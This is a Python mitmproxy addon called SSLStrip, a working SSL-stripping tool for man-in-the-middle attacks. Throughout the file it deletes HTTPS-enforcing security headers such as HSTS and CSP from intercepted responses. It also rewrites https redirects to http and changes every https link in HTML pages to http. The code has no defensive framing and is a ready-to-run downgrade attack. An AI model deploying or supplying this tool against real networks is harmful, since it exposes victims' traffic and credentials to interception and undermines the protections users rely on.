from mitmproxy import http
from mitmproxy import ctx
import re

class SSLStrip:
    def response(self, flow: http.HTTPFlow) -> None:
        if not flow.response:
            return

        headers = flow.response.headers

        # Remove HTTPS enforcement headers
        for h in (
            "strict-transport-security",
            "content-security-policy",
            "public-key-pins",
            "expect-ct",
            "upgrade-insecure-requests",
        ):
            headers.pop(h, None)

        # Rewrite redirects
        if "location" in headers:
            location = headers["location"]

            if location.startswith("https://"):
                new_location = location.replace(
                    "https://",
                    "http://",
                    1,
                )

                headers["location"] = new_location

                ctx.log.info(
                    f"Redirect rewritten: {location} -> {new_location}"
                )

        # Rewrite HTML bodies
        content_type = headers.get("content-type", "")

        if "text/html" not in content_type:
            return

        try:
            text = flow.response.get_text()

            # Rewrite absolute HTTPS links
            text = re.sub(
                r"https://",
                "http://",
                text,
                flags=re.IGNORECASE,
            )

            flow.response.set_text(text)

        except Exception as e:
            ctx.log.warn(f"Failed to rewrite body: {e}")

addons = [SSLStrip()]
